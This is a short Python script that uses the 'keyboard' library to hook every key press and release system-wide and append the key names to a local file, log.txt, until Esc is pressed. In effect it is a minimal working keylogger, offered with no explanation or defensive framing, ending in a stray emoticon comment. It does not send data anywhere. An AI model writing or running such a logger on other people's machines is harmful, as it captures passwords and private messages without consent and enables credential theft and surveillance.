import keyboard

keep = ''

def log(data, file_path = "./log.txt"):
    try:
        with open(file_path, 'a') as file:
            file.write(data)
    except Exception as e:
        print(f"Error writing to the file: {str(e)}")

def on_key_event(e):
    
    global keep
    if e.event_type == 'down':
        log(e.name)
    if e.event_type == 'up':
        log(' ')

keyboard.hook(on_key_event)
keyboard.wait('esc')
#     :3
